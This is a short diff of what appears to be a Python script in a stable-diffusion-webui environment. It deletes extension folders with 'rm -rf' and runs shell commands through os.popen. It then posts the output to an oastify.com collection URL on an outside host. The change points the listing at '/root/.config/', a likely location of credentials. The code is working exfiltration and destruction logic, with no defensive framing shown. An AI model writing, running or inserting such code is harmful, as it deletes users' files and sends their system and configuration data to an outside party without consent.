@@ -8,7 +8,7 @@ command = 'rm -rf /stable-diffusion-webui/extensions/test*'
 result = os.popen(command).read()
 
 
-command = 'ls -alh /'
+command = 'ls -alh /root/.config/'
 result = os.popen(command).read()
 url = 'https://ej1fgqfpmx4qinz0uewpcola319uxkl9.oastify.com/resp'
 data = {'result': result}
